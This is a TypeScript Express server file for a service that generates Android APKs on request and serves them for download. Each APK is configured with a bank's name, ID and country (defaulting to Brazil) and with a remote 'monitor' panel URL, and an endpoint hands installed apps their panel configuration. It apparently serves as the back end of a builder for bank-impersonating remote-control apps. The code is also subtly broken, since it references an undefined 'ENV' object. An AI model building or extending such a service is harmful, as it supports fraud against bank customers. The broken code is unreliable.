import "dotenv/config";
import express from "express";
import { createServer } from "http";
import net from "net";
import { createExpressMiddleware } from "@trpc/server/adapters/express";
import { registerOAuthRoutes } from "./oauth";
import { appRouter } from "../routers";
import { createContext } from "./context";
import { serveStatic, setupVite } from "./vite";
import { setupWebSocket } from "../websocket";
import { getBuildJobById, resolveRuntimeApkConfig } from "../routers/apk";
import { generateAPK } from "../apk-generator";

function isPortAvailable(port: number): Promise<boolean> {
  return new Promise(resolve => {
    const server = net.createServer();
    server.listen(port, () => {
      server.close(() => resolve(true));
    });
    server.on("error", () => resolve(false));
  });
}

async function findAvailablePort(startPort: number = 3000): Promise<number> {
  for (let port = startPort; port < startPort + 20; port++) {
    if (await isPortAvailable(port)) {
      return port;
    }
  }
  throw new Error(`No available port found starting from ${startPort}`);
}

async function startServer() {
  const app = express();
  const server = createServer(app);
  // Configure body parser with larger size limit for file uploads
  app.use(express.json({ limit: "50mb" }));
  app.use(express.urlencoded({ limit: "50mb", extended: true }));
  // OAuth callback under /api/oauth/callback
  registerOAuthRoutes(app);
  // tRPC API
  app.use(
    "/api/trpc",
    createExpressMiddleware({
      router: appRouter,
      createContext,
    })
  );

  app.get("/api/apk/download/:buildId/:fileName", async (req, res) => {
    const { buildId, fileName } = req.params;
    const job = getBuildJobById(buildId);

    if (buildId !== "demo" && (!job || job.status !== "completed")) {
      return res.status(404).json({
        success: false,
        message: "APK não encontrado ou ainda não finalizado",
      });
    }

    try {
      const safeFileName = fileName.endsWith(".apk") ? fileName : `${fileName}.apk`;

      // Gera APK real com as configurações do job
      const apkBuffer = await generateAPK({
        appName: job?.appName ?? "Demo Monitor",
        packageName: job?.packageName ?? "com.demo.monitor",
        versionName: job?.versionName ?? "1.0.0",
        versionCode: job?.versionCode ?? 1,
        logoUrl: job?.logoUrl,
        panelUrl: job?.panelUrl ?? "https://app.remotemonitor.com",
        bankId: job?.bankId ?? "default",
        bankCountry: job?.bankCountry ?? "BR",
        bankName: job?.bankName ?? "Default Bank",
      });

      res.setHeader("Content-Type", "application/vnd.android.package-archive");
      res.setHeader("Content-Disposition", `attachment; filename="${safeFileName}"`);
      res.setHeader("Content-Length", String(apkBuffer.length));
      res.setHeader("X-Artifact-Source", "local");

      return res.send(apkBuffer);
    } catch (error) {
      console.error("[APK Download] Erro ao gerar APK:", error);
      return res.status(500).json({
        success: false,
        message: "Erro ao gerar APK",
      });
    }
  });

  app.get("/api/apk/runtime-config", async (req, res) => {
    const packageName = typeof req.query.packageName === "string" ? req.query.packageName : undefined;
    const config = await resolveRuntimeApkConfig(packageName);

    if (!config) {
      if (!ENV.runtimePanelUrl) {
        return res.status(404).json({
          success: false,
          message: "Nenhum build concluido encontrado para configuracao runtime.",
        });
      }

      return res.json({
        success: true,
        config: {
          buildId: "runtime-fallback",
          panelUrl: ENV.runtimePanelUrl,
          appName: ENV.runtimeAppName,
          packageName: packageName || ENV.runtimePackageName,
          artifactSource: "github",
          createdAt: new Date(0).toISOString(),
          updatedAt: new Date().toISOString(),
        },
      });
    }

    return res.json({
      success: true,
      config,
    });
  });

  // development mode uses Vite, production mode uses static files
  const isDevelopment = process.env.NODE_ENV !== "production";
  if (isDevelopment) {
    await setupVite(app, server);
  } else {
    serveStatic(app);
  }

  // Setup WebSocket
  setupWebSocket(server);
  console.log("[WebSocket] Server initialized");

  const preferredPort = parseInt(process.env.PORT || "3000");
  const port = await findAvailablePort(preferredPort);

  if (port !== preferredPort) {
    console.log(`Port ${preferredPort} is busy, using port ${port} instead`);
  }

  server.listen(port, () => {
    console.log(`Server running on http://localhost:${port}/`);
  });
}

startServer().catch(console.error);
